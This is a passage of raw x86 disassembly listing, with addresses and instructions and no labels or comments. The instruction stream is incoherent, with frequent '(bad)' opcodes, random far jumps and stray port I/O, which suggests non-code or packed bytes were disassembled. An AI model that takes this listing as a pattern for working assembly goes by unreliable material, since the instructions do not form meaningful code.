  415d27:	xor    esi,DWORD PTR [edx]
  415d29:	(bad)  
  415d2a:	push   edi
  415d2b:	test   al,0xf7
  415d2d:	mov    ebp,0xfa51cb8d
  415d32:	mov    ebp,0xe048a5d9
  415d37:	sahf   
  415d38:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415d39:	xchg   ebx,eax
  415d3a:	inc    esp
  415d3b:	jg     0x415d9b
  415d3d:	test   eax,0x16a78da1
  415d42:	fdiv   DWORD PTR [edi-0x76462c10]
  415d48:	pop    esi
  415d49:	push   edx
  415d4a:	addr16 in al,0xae
  415d4d:	call   0x606fdde8
  415d52:	aaa    
  415d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d54:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415d55:	addr16 fwait
  415d57:	mov    cl,0x52
  415d59:	outs   dx,BYTE PTR ds:[esi]
  415d5a:	jg     0x415dc7
  415d5c:	push   es
  415d5d:	and    eax,0x1c882e29
  415d62:	dec    eax
  415d63:	push   ds
  415d64:	fs sub al,0x97
  415d67:	lock mov ?,WORD PTR [edi+0x38]
  415d6b:	mov    edi,eax
  415d6d:	das    
  415d6e:	out    dx,al
  415d6f:	or     edx,DWORD PTR [edx+ebp*4]
  415d72:	std    
  415d73:	xchg   ebx,eax
  415d74:	pop    esp
  415d75:	or     BYTE PTR [esi-0x12],ah
  415d78:	xchg   edx,eax
  415d79:	and    bl,al
  415d7b:	pop    ss
  415d7c:	(bad)  
  415d7d:	call   0xc534b32f
  415d82:	loope  0x415dbb
  415d84:	fisubr DWORD PTR [eax]
  415d86:	mov    dh,0xd0
  415d88:	mov    es,WORD PTR [ecx-0xf]
  415d8b:	fwait
  415d8c:	push   ebx
  415d8d:	call   0x5f11:0xf2f0a3d1
  415d94:	jg     0x415dcc
  415d96:	or     al,0x9a
  415d98:	inc    edi
  415d99:	mov    eax,0xd7919819
  415d9e:	lods   al,BYTE PTR ds:[esi]
  415d9f:	fmulp  st(2),st
  415da1:	popf   
  415da2:	sbb    edi,DWORD PTR [esp+edx*4-0x6623a634]
  415da9:	aaa    
  415daa:	mov    eax,0xc44b0512
  415daf:	popf   
  415db0:	loope  0x415df3
  415db2:	je     0x415d42
  415db4:	mov    esp,0x368c6247
  415db9:	cmp    eax,0xd5c03d2d
  415dbe:	das    
  415dbf:	pop    edx
  415dc0:	mov    eax,ds:0x492846e0
  415dc5:	inc    eax
  415dc6:	mov    WORD PTR [ebx],ss
  415dc8:	paddsb mm3,QWORD PTR [edx-0x5a8222ed]
  415dcf:	sub    BYTE PTR [edx-0x30],ch
  415dd2:	sub    eax,0x4256b73b
  415dd7:	push   ecx
  415dd8:	dec    ebx
  415dd9:	out    dx,eax
  415dda:	add    al,0x2
  415ddc:	xor    eax,0xc868a606
  415de1:	retf   0x4c61
  415de4:	addr16 pop ecx
  415de6:	or     al,0x86
  415de8:	iret   
  415de9:	gs add ch,al
  415dec:	and    esp,DWORD PTR [edi-0x3b5e3af9]
  415df2:	in     al,dx
  415df3:	push   es
  415df4:	xor    dl,ah
  415df6:	ror    DWORD PTR [ebx+0x5e],1
  415df9:	fs xchg esp,eax
  415dfb:	push   ebx
  415dfc:	jecxz  0x415d81
  415dfe:	dec    edx
  415dff:	bound  esp,QWORD PTR [edx-0x4b79a48f]
  415e05:	cmc    
  415e06:	int    0xff
  415e08:	dec    ebp
  415e09:	test   BYTE PTR [ebx-0x43ba4bc5],0x2f
  415e10:	in     eax,0xc0
  415e12:	adc    al,0xf9
  415e14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415e15:	inc    eax
  415e16:	mov    eax,DWORD PTR [edi+0x69]
  415e19:	dec    ebp
  415e1a:	popa   
  415e1b:	xchg   BYTE PTR [esi+0x1c2e0b4],dl
  415e21:	bound  ebx,QWORD PTR [edx+0x3bb6689a]
  415e27:	addr16 inc ebx
  415e29:	adc    dl,BYTE PTR [ebp+0x4fda8edb]
  415e2f:	mov    al,ds:0x5afeaee5
  415e34:	mov    eax,ds:0x686e7e6b
  415e39:	pop    ss
  415e3a:	dec    esp
  415e3b:	rcr    BYTE PTR [edi-0x73664371],cl
  415e41:	xchg   BYTE PTR ds:[ebx+0x4d],bh
  415e45:	cdq    
  415e46:	aaa    
  415e47:	push   esp
  415e48:	fistp  WORD PTR [edx+0x4a89762d]
  415e4e:	aam    0x49
  415e50:	pop    ecx
  415e51:	pop    eax
  415e52:	les    ecx,FWORD PTR [edx+edx*8+0xf4c4990]
  415e59:	xor    ah,BYTE PTR [eax+0x5a]
  415e5c:	nop
  415e5d:	push   eax
  415e5e:	(bad)  
  415e5f:	mul    DWORD PTR [ebx+0x77]
  415e62:	hlt    
  415e63:	call   0xe957:0x316ba422
  415e6a:	mov    dl,0xd7
  415e6c:	stc    
  415e6d:	adc    eax,0xe98d9da8
  415e72:	lods   eax,DWORD PTR ds:[esi]
  415e73:	sub    al,bl
  415e75:	neg    bl
  415e77:	or     BYTE PTR [ebx-0x80],ch
  415e7a:	add    ah,BYTE PTR [ebp-0x57]
  415e7d:	imul   edx,DWORD PTR [esi],0xffffffb2
  415e80:	sbb    al,0x5
  415e82:	dec    ecx
  415e83:	(bad)  
  415e84:	mov    esi,0x91a80afe
  415e89:	pop    es
  415e8a:	push   edx
  415e8b:	pop    ds
  415e8c:	(bad)  
  415e8d:	mov    ebp,DWORD PTR ss:[ecx+esi*1-0x7c729ce6]
  415e95:	mov    esp,0xba95cef
  415e9a:	pop    esp
  415e9b:	int3   
  415e9c:	sub    DWORD PTR [esi],eax
  415e9e:	add    al,0x7f
  415ea0:	les    esp,FWORD PTR ds:0xa3ee5ff6
  415ea6:	mov    dl,0x14
  415ea8:	inc    ebx
  415ea9:	imul   eax,DWORD PTR [ecx+0x2d62076e],0x3c63b894
  415eb3:	pop    ecx
  415eb4:	cmp    al,0x34
  415eb6:	stc    
  415eb7:	jl     0x415ea7
  415eb9:	rcl    esp,1
  415ebb:	cmc    
  415ebc:	push   ecx
  415ebd:	outs   dx,BYTE PTR ds:[esi]
  415ebe:	push   edx
  415ebf:	data16 cld 
  415ec1:	sbb    BYTE PTR [ebx-0x6f],0xe7
  415ec5:	pop    esi
  415ec6:	jecxz  0x415ed8
  415ec8:	or     eax,0xd06abafa
  415ecd:	push   ss
  415ece:	jge    0x415e58
  415ed0:	cmc    
  415ed1:	inc    ecx
  415ed2:	add    DWORD PTR [ebx+edi*1+0x39bac3dc],esp
  415ed9:	js     0x415f2c
  415edb:	cmp    bl,BYTE PTR [ebx+0x7c3ab452]
  415ee1:	mov    ebp,0x39f2cedd
  415ee6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415ee7:	jo     0x415eda
  415ee9:	or     ebp,DWORD PTR [ebx+0x7c1e9a35]
  415eef:	ja     0x415f70
  415ef1:	inc    esp
  415ef2:	mov    ch,0x9f
  415ef4:	loope  0x415f3a
  415ef6:	in     al,dx
  415ef7:	jle    0x415f2f
  415ef9:	nop
  415efa:	adc    al,0xc1
  415efc:	dec    edx
  415efd:	jbe    0x415f65
  415eff:	leave  
  415f00:	pop    ss
  415f01:	ins    BYTE PTR es:[edi],dx
  415f02:	push   0x53a58164
  415f07:	lock ins BYTE PTR es:[edi],dx
  415f09:	hlt    
  415f0a:	enter  0x3122,0xeb
  415f0e:	je     0x415ef4
  415f10:	dec    esp
  415f11:	sbb    dl,cl
  415f13:	inc    ebp
  415f14:	ret    0x121d
  415f17:	sub    ecx,ebx
  415f19:	rcl    DWORD PTR [ebp*2+0x61404b7e],0x17
  415f21:	mov    esp,0xb9cf49c5
  415f26:	jne    0x415eee
  415f28:	jg     0x415f2e
  415f2a:	dec    ecx
  415f2b:	xor    DWORD PTR [ebx+0x63ced576],ebp
  415f31:	dec    ebx
  415f32:	int    0x8e
  415f34:	and    ch,BYTE PTR [esi-0x4fc3bca5]
  415f3a:	ja     0x415f5f
  415f3c:	cmp    eax,0x199a5c7c
  415f42:	xor    ebp,esp
  415f44:	and    al,0x77
  415f46:	push   ecx
  415f47:	pop    eax
  415f48:	add    eax,0x148d7b43
  415f4d:	pop    eax
  415f4e:	mov    di,0x7ed4
  415f52:	ins    BYTE PTR es:[edi],dx
  415f53:	popa   
  415f54:	(bad)  
  415f55:	jae    0x415fc3
  415f57:	or     DWORD PTR [esp+ebp*4],esi
  415f5a:	ret    0xc55e
  415f5d:	shl    DWORD PTR [eax],0x6a
  415f60:	inc    eax
  415f61:	pop    edx
  415f62:	push   edi
  415f63:	xlat   BYTE PTR ds:[ebx]
  415f64:	mov    ecx,0x24d63e87
  415f69:	jns    0x415fa2
  415f6b:	xchg   edi,eax
  415f6c:	and    esp,DWORD PTR [ebx+0x68]
  415f6f:	sbb    edi,DWORD PTR [esi+0x3ca542bf]
  415f75:	test   BYTE PTR [di+0x6076],bh
  415f7a:	arpl   WORD PTR ds:0x810410ef,ax
  415f80:	pop    ebp
  415f81:	int3   
  415f82:	mov    ds:0x78cb38ac,eax
  415f87:	inc    ebp
  415f88:	sub    BYTE PTR [ecx],ch
  415f8a:	(bad)
  415f8d:	push   cs
  415f8e:	or     eax,0xbedc5a75
  415f93:	adc    eax,0xc25259a4
  415f98:	imul   esi,DWORD PTR [ebx],0xa4d6072a
  415f9e:	mov    al,0xb4
  415fa0:	je     0x415f9e
  415fa2:	retf   0xdfb7
  415fa5:	or     eax,ebp
  415fa7:	imul   BYTE PTR ds:0xdcc53ce4
  415fad:	xor    ch,BYTE PTR [edi+0x22520e8c]
  415fb3:	mov    esi,0xdb51e3eb
  415fb8:	fdivp  st(4),st
  415fba:	jecxz  0x415f8b
  415fbc:	push   ds
  415fbd:	lds    ecx,FWORD PTR [ebx]
  415fbf:	and    eax,DWORD PTR [ebp+edx*8-0x7f]
  415fc3:	dec    esp
  415fc4:	loope  0x415f93
  415fc6:	pushf  
  415fc7:	inc    ebp
  415fc8:	jbe    0x41600e
  415fca:	xlat   BYTE PTR ds:[ebx]
  415fcb:	fwait
  415fcc:	push   ebp
  415fcd:	mov    esi,0x6722ad82
  415fd2:	(bad)  [ecx+0x4b]
  415fd5:	sbb    esi,ecx
  415fd7:	or     BYTE PTR [esi+0x2ae3fbba],ah
  415fdd:	jmp    0x951c:0xda1cbc3c
  415fe4:	mov    bl,0x3e
  415fe6:	test   ecx,esp
  415fe8:	bnd jnp 0x416030
  415feb:	pop    ds
  415fec:	dec    eax
  415fed:	iret   
  415fee:	rol    DWORD PTR [esi+0x426c9722],0xc4
  415ff5:	adc    DWORD PTR [esi],esp
  415ff7:	xchg   DWORD PTR [esi-0x58],esi
  415ffa:	hlt    
  415ffb:	sub    DWORD PTR [edi-0x256e3006],ebp
  416001:	adc    dl,cl
  416003:	test   al,0x1a
  416005:	rcr    bl,cl
  416007:	bound  edi,QWORD PTR [edx-0xfb23d4]
  41600d:	je     0x416075
  41600f:	cmp    DWORD PTR [ebx+0x25],0x6046acc4
  416016:	or     eax,0x71fc5e27
  41601b:	dec    esp
  41601c:	lock jns 0x415fb8
  41601f:	adc    edx,eax
  416021:	xchg   ebx,eax
  416022:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  416024:	add    bl,bl
  416026:	mov    al,al
  416028:	out    0xd,eax
  41602a:	push   edx
  41602b:	lock or ch,BYTE PTR [esi-0x3bd8d769]
  416032:	daa    
  416033:	xchg   esp,eax
  416034:	xchg   ebp,eax
  416035:	(bad)  
  416037:	sbb    al,0xe3
  416039:	mov    ecx,0x82e2fc7d
  41603e:	icebp  
  41603f:	push   0xffffffe8
  416041:	push   esi
  416042:	inc    ebx
  416043:	mov    dl,0xdb
  416045:	sbb    BYTE PTR ds:0x4e0e7f00,bh
  41604b:	data16 daa 
  41604d:	and    esp,eax
  41604f:	xchg   ebx,eax
  416050:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  416052:	xor    BYTE PTR [eax+0x54811e62],dl
  416058:	(bad)  
  416059:	cwde   
  41605a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41605b:	pusha  
  41605c:	mov    ebp,0x4fbbbf2b
  416061:	ror    BYTE PTR [ecx+0x62],cl
  416064:	retf   
  416065:	mov    bl,0x1d
  416067:	and    ebp,esp
  416069:	imul   esp,DWORD PTR [edi+esi*4],0x27
  41606d:	jbe    0x4160e0
  41606f:	push   ebp
  416070:	call   DWORD PTR [eax+0x76]
  416073:	je     0x41600f
  416075:	fiadd  WORD PTR [ebx-0x6e]
  416078:	push   edx
  416079:	enter  0xd9d1,0xd
  41607d:	jns    0x416061
  41607f:	mov    bl,0xb0
  416081:	nop
  416082:	mov    bh,0xa1
  416084:	jle    0x416066
  416086:	jl     0x416102
  416088:	cmp    ah,0xe2
  41608b:	gs jns 0x4160ac
  41608e:	fwait
  41608f:	cwde   
  416090:	push   0x9680f8d1
  416095:	mov    ch,0x7f
  416097:	jns    0x4160bd
  416099:	pop    edi
  41609a:	imul   ebx,esi,0x5c1f733
  4160a0:	jne    0x41608f
  4160a2:	xlat   BYTE PTR ds:[ebx]
  4160a3:	retf   0xe337
  4160a6:	pop    ebp
  4160a7:	push   ss
  4160a8:	outs   dx,DWORD PTR ds:[esi]
  4160a9:	xor    esp,DWORD PTR [ebx+ebx*4+0x47]
  4160ad:	fs mov dl,0xd7
  4160b0:	icebp  
  4160b1:	imul   eax,edx,0x4f
  4160b4:	mov    ebx,0x9dd22e8a
  4160b9:	jge    0x4160c1
  4160bb:	loopne 0x41605c
  4160bd:	fisub  WORD PTR [edx]
  4160bf:	addr16 inc ebx
  4160c1:	dec    edx
  4160c2:	jge    0x416053
  4160c4:	repnz popa 
  4160c6:	sti    
  4160c7:	xchg   esp,eax
  4160c8:	and    DWORD PTR [ebx+0x41b44c32],ebx
  4160ce:	pop    edi
  4160cf:	mov    ebp,0xc6832bb6
  4160d4:	mov    ds:0xcc410b17,al
  4160d9:	cmp    DWORD PTR [edi+0x4c94a25e],eax
  4160df:	lea    ebp,[edi]
  4160e1:	sub    eax,0xaee100f1
  4160e6:	jmp    0xeed6:0xccbb445
  4160ed:	sbb    al,0xf2
  4160ef:	scas   eax,DWORD PTR es:[edi]
  4160f0:	pop    ds
  4160f1:	and    cl,BYTE PTR [eax]
  4160f3:	sbb    dh,BYTE PTR [edi-0x61]
  4160f6:	xlat   BYTE PTR ds:[ebx]
  4160f7:	(bad)  
  4160f8:	xchg   ebx,eax
  4160f9:	push   esp
  4160fa:	sbb    DWORD PTR [ebp+ecx*8+0x4350fc31],eax
  416101:	mov    ds:0x37546cb3,al
  416106:	fcom   st(2)
  416108:	sbb    dh,BYTE PTR [esi]
  41610a:	mov    ch,ah
  41610c:	pop    esp
  41610d:	mov    cl,0xa8
  41610f:	and    cl,BYTE PTR [ecx+0x1ff6ac87]
  416115:	iret   
  416116:	xor    DWORD PTR [esp+ebx*8-0x37ac4aba],edi
  41611d:	pop    edx
  41611e:	retf   
  41611f:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416121:	nop
  416122:	sbb    DWORD PTR [esi-0x10722810],ecx
  416128:	shl    ah,1
  41612a:	inc    ecx
  41612b:	inc    ebp
  41612c:	test   eax,0x59bb4ec7
  416131:	(bad)  
  416132:	aas    
  416133:	pop    ecx
  416134:	or     BYTE PTR [edx+ecx*1+0x777c64a6],cl
  41613b:	lea    esi,[eax]
  41613d:	jno    0x4161a9
  41613f:	mov    esi,0x4c50cdf7
  416144:	mov    al,bl
  416146:	jg     0x41611f
  416148:	scas   al,BYTE PTR es:[edi]
  416149:	sub    al,0x39
  41614b:	mov    al,ds:0x692ec2be
  416150:	xchg   DWORD PTR [edi-0x53f2d188],ecx
  416156:	sub    DWORD PTR [ebp-0x1c],ebp
  416159:	mov    esp,0xa1b07b3f
  41615e:	rcl    DWORD PTR [ebp+0x5d1a6d4f],cl
  416164:	(bad)  [edx+edx*4]
  416167:	mov    edx,0x76c1f664
  41616c:	aad    0xad
  41616e:	aaa    
  41616f:	(bad)  
  416171:	add    bh,BYTE PTR [eax+0x2e]
  416174:	xchg   esp,eax
  416175:	into   
  416176:	cli    
  416177:	neg    DWORD PTR [ebp-0x4b]
  41617a:	inc    esp
  41617b:	cmp    BYTE PTR [ecx],ch
  41617d:	aaa    
  41617e:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  416180:	dec    esi
  416181:	adc    ecx,DWORD PTR [esp+eax*2+0x29b69b92]
  416188:	sub    al,0xfa
  41618a:	or     esp,0xffffffcb
  41618d:	dec    ebp
  41618e:	or     eax,DWORD PTR [ecx+ecx*2]
  416191:	adc    al,0xb9
  416193:	dec    esp
  416194:	xchg   esp,eax
  416195:	dec    ecx
  416196:	cmp    BYTE PTR [ebx+0x44],0xfe
  41619a:	and    eax,0x2377a689
  41619f:	(bad)  
  4161a0:	push   edi
  4161a1:	pop    edx
  4161a2:	inc    esi
  4161a3:	retf   0xc395
  4161a6:	por    mm3,QWORD PTR [edx+0x587163cb]
  4161ad:	lea    ebp,[edx]
  4161af:	dec    ebx
  4161b0:	adc    BYTE PTR [edx+0x32e2c5c7],bl
  4161b6:	push   ebx
  4161b7:	mov    WORD PTR [edi+0x55],ss
  4161ba:	clc    
  4161bb:	fs int 0x61
  4161be:	xchg   ebp,eax
  4161bf:	xchg   ebp,eax
  4161c0:	ins    BYTE PTR es:[edi],dx
  4161c1:	pop    ds
  4161c2:	or     edi,edx
  4161c4:	sub    DWORD PTR [edi+0x7c70f9c],esp
  4161ca:	iret   
  4161cb:	lock or bh,cl
  4161ce:	arpl   ax,si
  4161d0:	dec    eax
  4161d1:	push   edx
  4161d2:	and    eax,0xcf9be779
  4161d7:	dec    esp
  4161d8:	sbb    BYTE PTR [ecx-0x29],ah
  4161db:	stc    
  4161dc:	call   0xbc83e22
  4161e1:	fnop   
  4161e3:	sub    dl,bl
  4161e5:	or     eax,DWORD PTR [edx-0x1e]
  4161e8:	dec    DWORD PTR [ecx-0x5e75983b]
  4161ee:	fcmovbe st,st(3)
  4161f0:	mov    bl,0xbb
  4161f2:	xchg   ebp,eax
  4161f3:	ror    DWORD PTR [edx],1
  4161f5:	mov    WORD PTR [edi+0x54a7e66c],?
  4161fb:	call   0x6de469dd
  416200:	mov    eax,ds:0xdf761931
  416205:	nop
  416206:	idiv   DWORD PTR [edx+ebp*8-0x2bec4324]
  41620d:	xchg   edx,eax
  41620e:	ficomp DWORD PTR [edi-0x1513c0d1]
  416214:	jge    0x41624f
  416216:	and    BYTE PTR [esi+esi*4],0x52
  41621a:	mov    esp,0xbbf8d4a2
  41621f:	jg     0x416208
  416221:	xchg   ebx,eax
  416222:	(bad)  
  416223:	jmp    FWORD PTR [ebx]
  416225:	stc    
  416226:	ins    DWORD PTR es:[edi],dx
  416227:	ins    BYTE PTR es:[edi],dx
  416228:	dec    esp
  416229:	test   BYTE PTR [edi],ah
  41622b:	jne    0x4161e8
  41622d:	push   ebx
  41622e:	repnz add BYTE PTR [edi+0x2255f7b0],bl
  416235:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416236:	add    edx,esi
  416238:	cld    
  416239:	xor    DWORD PTR [ecx-0x7899ce4f],0xd82649b6
  416243:	xchg   ebx,eax
  416244:	mov    esp,ss
  416246:	xor    BYTE PTR [ecx-0x7033b932],bl
  41624c:	test   dh,ch
  41624e:	sub    dh,BYTE PTR [ecx+ebx*1]
  416251:	jmp    0x3da5:0x69e2175
  416258:	adc    edi,edx
  41625a:	mov    eax,0x51f4d900
  41625f:	loop   0x4162df
  416261:	(bad)  
  416263:	into   
  416264:	icebp  
  416265:	xlat   BYTE PTR ds:[ebx]
  416266:	sub    DWORD PTR [edi],ebp
  416268:	mov    BYTE PTR [edi],ah
  41626a:	mov    ah,0xb4
  41626c:	mov    eax,ds:0xe1eae10d
  416271:	dec    cl
  416273:	sub    eax,0x6cb8ba51
  416278:	call   0xce51:0x798ed9e
  41627f:	mov    edx,0x84899281
  416284:	jae    0x416262
  416286:	jp     0x416242
  416288:	jg     0x41623a
  41628a:	xchg   esi,eax
  41628b:	xchg   esi,eax
  41628c:	imul   ecx,DWORD PTR [edi-0x43e1a81f],0xa36214b3
  416296:	push   ds
  416297:	inc    eax
  416298:	imul   BYTE PTR [edi+edi*1]
  41629b:	add    BYTE PTR [ebx-0x18],ch
  41629e:	dec    edi
  41629f:	mov    al,0xd4
  4162a1:	test   eax,0x6fd73ddf
  4162a6:	sbb    ch,bh
  4162a8:	repnz (bad) 
  4162aa:	fisttp QWORD PTR [esi+0x41]
  4162ad:	jp     0x416253
  4162af:	fidivr DWORD PTR [ecx-0x4]
  4162b2:	iret   
  4162b3:	cli    
  4162b4:	rcr    DWORD PTR ds:0xe2e625ab,0x4c
  4162bb:	jl     0x41624c
  4162bd:	adc    al,0x7e
  4162bf:	mov    dh,BYTE PTR [esi+0x48892b46]
  4162c5:	mov    DWORD PTR [ebx],ebx
  4162c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4162c8:	jns    0x4162b1
  4162ca:	sbb    esi,0xabfcd39d
  4162d0:	test   eax,0x5883515e
  4162d5:	xor    eax,0xeb6665a2
  4162da:	ficom  WORD PTR [ebx]
  4162dc:	cmp    DWORD PTR [ebx],esi
  4162de:	pop    ecx
  4162df:	int3   
  4162e0:	or     ecx,DWORD PTR [ecx+edi*4]
  4162e3:	push   es
  4162e4:	test   al,0x8
  4162e6:	mov    ebp,0x2364f5a7
  4162eb:	lods   al,BYTE PTR ds:[esi]
  4162ec:	xor    esi,eax
  4162ee:	iret   
  4162ef:	xchg   BYTE PTR [edi+0x203886a8],dl
  4162f5:	jae    0x416365
  4162f7:	dec    esp
  4162f8:	mov    esp,ebp
  4162fa:	pop    es
  4162fb:	jg     0x4162c1
  4162fd:	setg   BYTE PTR [ecx+0x20]
  416301:	add    al,0x22
  416303:	dec    edx
  416304:	sbb    al,0x11
  416306:	cmp    ecx,ecx
  416308:	or     DWORD PTR [ebx+0x4690ee22],edi
  41630e:	ds jae 0x416386
  416311:	add    bh,BYTE PTR [edx]
  416313:	pop    ecx
  416314:	fmul   DWORD PTR [ecx]
  416316:	imul   eax,edx,0xffffff94
  416319:	xchg   ebx,eax
  41631a:	(bad)  
  41631b:	dec    ebx
  41631c:	push   ss
  41631d:	scas   eax,DWORD PTR es:[edi]
  41631e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41631f:	not    BYTE PTR [ebx+eax*4]
  416322:	push   eax
  416323:	ins    DWORD PTR es:[edi],dx
  416324:	jle    0x41632f
  416326:	test   DWORD PTR [eax],esi
  416328:	dec    ecx
  416329:	mov    edi,0x3bb9429c
  41632e:	fldcw  WORD PTR [edx-0x64]
  416331:	push   eax
  416332:	into   
  416333:	jb     0x416313
  416335:	(bad)  
  416337:	xchg   edx,eax
  416338:	fisubr DWORD PTR [edx+0x17]
  41633b:	minps  xmm7,XMMWORD PTR [ecx-0x3c]
  41633f:	pop    esi
  416340:	sbb    dh,0xc4
  416343:	dec    ebp
  416344:	xchg   ebx,eax
  416345:	cli    
  416346:	xor    ch,BYTE PTR [ebp+0x4c752ced]
  41634c:	mov    esp,0x97fd3ff8
  416351:	ret    
  416352:	xchg   dx,ax
  416354:	out    0x59,eax
  416356:	and    eax,0x3ce96395
  41635b:	stc    
  41635c:	rcr    DWORD PTR [ecx+0x1c],cl
  41635f:	(bad)
  416362:	and    BYTE PTR [eax-0x41],dl
  416365:	push   ebx
  416366:	out    0xb4,eax
  416368:	rcl    DWORD PTR [eax+ebp*1],cl
  41636b:	add    BYTE PTR [esp+ecx*1],bh
  41636e:	(bad)  
  416370:	mov    ecx,0xa1a9e6dc
  416375:	arpl   WORD PTR [esi-0x42],bp
  416378:	mov    BYTE PTR [ebp-0x1aa3211f],al
  41637e:	repz out 0x5f,eax
  416381:	jmp    0xdb67ea64
  416386:	test   ah,bh
  416388:	scas   al,BYTE PTR es:[edi]
  416389:	jmp    0x416399
  41638b:	mov    DWORD PTR [ecx-0x4e3ff61],eax
  416391:	ret    
  416392:	pop    ebx
  416393:	jmp    0x17316d85
  416398:	test   eax,0xb6a8d079
  41639d:	(bad)  
  41639f:	xchg   BYTE PTR [bx+si-0x76],ch
  4163a3:	jp     0x4163a9
  4163a5:	pop    edx
  4163a6:	ret    
  4163a7:	jg     0x4163da
  4163a9:	cmp    al,0xec
  4163ab:	push   eax
  4163ac:	sub    BYTE PTR [eax-0x4e],bl
  4163af:	js     0x41638e
  4163b1:	push   DWORD PTR [esi+0x1276e591]
  4163b7:	mov    eax,0xe49dbec6
  4163bc:	inc    ebx
  4163bd:	sbb    DWORD PTR [edi],ebp
  4163bf:	ins    BYTE PTR es:[edi],dx
  4163c0:	mov    ecx,DWORD PTR [esp+ebp*4]
  4163c3:	data16 data16 ss xlat BYTE PTR cs:[ebx]
  4163c8:	shl    eax,1
  4163ca:	pop    esi
  4163cb:	(bad)  
  4163cc:	jo     0x416420
  4163ce:	in     eax,0xb8
  4163d0:	fadd   DWORD PTR [ecx+0x1bde0b9f]
  4163d6:	mov    BYTE PTR cs:[esi],dl
  4163d9:	std    
  4163da:	js     0x41640d
  4163dc:	mov    dl,0x33
  4163de:	cdq    
  4163df:	fnstcw WORD PTR [edi+0x178d73fd]
  4163e5:	not    cl
  4163e7:	repnz stos BYTE PTR es:[edi],al
  4163e9:	ds xchg edi,eax
  4163eb:	mov    ecx,0xb641cd7b
  4163f0:	int3   
  4163f1:	and    al,0xb6
  4163f3:	sti    
  4163f4:	cli    
  4163f5:	dec    eax
  4163f6:	ret    
  4163f7:	push   esp
  4163f8:	arpl   bp,si
  4163fa:	popf   
  4163fb:	shr    eax,0x9b
  4163fe:	inc    eax
  4163ff:	mov    DWORD PTR [edx-0x70],ebp
  416402:	push   edi
  416403:	push   eax
  416404:	out    0xcb,eax
  416406:	xlat   BYTE PTR ds:[ebx]
  416407:	xlat   BYTE PTR ds:[ebx]
  416408:	jp     0x4163eb
  41640a:	imul   eax,eax,0x62
  41640d:	lea    eax,[edi+0x331ede81]
  416413:	sbb    esp,DWORD PTR [ebp+0x17a05cd9]
  416419:	push   esp
  41641a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41641b:	stos   DWORD PTR es:[edi],eax
  41641c:	ss jo  0x416468
  41641f:	xor    DWORD PTR [esi+edi*2],ebx
  416422:	xchg   ebp,eax
  416423:	push   cs
  416424:	push   ss
  416425:	xor    eax,0x99656e93
  41642a:	outs   dx,DWORD PTR ds:[esi]
  41642b:	outs   dx,DWORD PTR ds:[esi]
  41642c:	mov    ds:0x910e8a6d,eax
  416431:	aaa    
  416432:	stos   DWORD PTR es:[edi],eax
  416433:	inc    edx
  416434:	or     al,0xb6
  416436:	fld    DWORD PTR [eax+0x5085dc2]
  41643c:	mov    ?,eax
  41643e:	xchg   edx,eax
  41643f:	dec    eax
  416440:	in     eax,dx
  416441:	dec    ecx
  416442:	cmp    al,0x2
  416444:	(bad)  
  416446:	call   0x5597:0x6c067aa4
  41644d:	sahf   
  41644e:	ins    BYTE PTR es:[edi],dx
  41644f:	inc    edx
  416450:	dec    esp
  416451:	xchg   ebx,eax
  416452:	shl    DWORD PTR [edx+0x24],1
  416455:	sti    
  416456:	push   ebp
  416457:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416458:	adc    cl,ah
  41645a:	fistp  QWORD PTR [esi]
  41645c:	mov    al,ds:0xc2914537
  416461:	adc    al,0x5f
  416463:	sbb    BYTE PTR [ecx+0x53],bh
  416466:	xor    DWORD PTR [eax-0x2a],esi
  416469:	icebp  
  41646a:	pop    esi
  41646b:	xor    bl,ch
  41646d:	or     DWORD PTR [ebp+0x78],ebx
  416470:	or     BYTE PTR [ebx+0x4f],dh
  416473:	test   BYTE PTR [ebx-0x54ef906f],al
  416479:	mov    ch,0xc8
  41647b:	push   esp
  41647c:	push   es
  41647d:	lahf   
  41647e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41647f:	out    0xee,al
  416481:	imul   edx,DWORD PTR ds:0x2f070b2a,0x22
  416488:	(bad)  
  41648a:	or     edi,ebx
  41648c:	add    BYTE PTR es:[ecx-0x66],dh
  416490:	jbe    0x41643a
  416492:	int3   
  416493:	aad    0xa6
  416495:	sar    BYTE PTR [ebx-0x14],0xe0
  416499:	push   edx
  41649a:	les    eax,FWORD PTR [eax]
  41649c:	add    ebp,DWORD PTR [esi+0x76]
  41649f:	or     al,0x95
  4164a1:	ins    BYTE PTR es:[edi],dx
  4164a2:	lea    edi,[ebp+0x66652ab0]
  4164a8:	jle    0x4164e3
  4164aa:	dec    eax
  4164ab:	imul   edx,DWORD PTR [esi],0xa89fe680
  4164b1:	pop    edi
  4164b2:	je     0x41650f
  4164b4:	or     dl,BYTE PTR [ebx+0x1e]
  4164b7:	inc    esp
  4164b8:	fimul  DWORD PTR [ecx]
  4164ba:	mov    dl,0x53
  4164bc:	test   eax,0x1a6cf219
  4164c1:	loop   0x4164ef
  4164c3:	scas   al,BYTE PTR es:[edi]
  4164c4:	xchg   edi,eax
  4164c5:	ss xchg edi,eax
  4164c7:	fldcw  WORD PTR [ecx-0x60458a79]
  4164cd:	iret   
  4164ce:	fdiv   DWORD PTR [ebp+0x5bb087f9]
  4164d4:	dec    ebp
  4164d5:	xor    BYTE PTR [esi-0x5f],bl
  4164d8:	xchg   esi,eax
  4164d9:	sub    eax,0x52410dc2
  4164de:	dec    esp
  4164df:	and    ecx,DWORD PTR [edi+0x53]
  4164e2:	push   cs
  4164e3:	ja     0x4164d5
  4164e5:	call   0xbe99d532
  4164ea:	or     eax,esi
  4164ec:	or     edi,ebx
  4164ee:	ds das 
  4164f0:	(bad)  
  4164f1:	dec    ecx
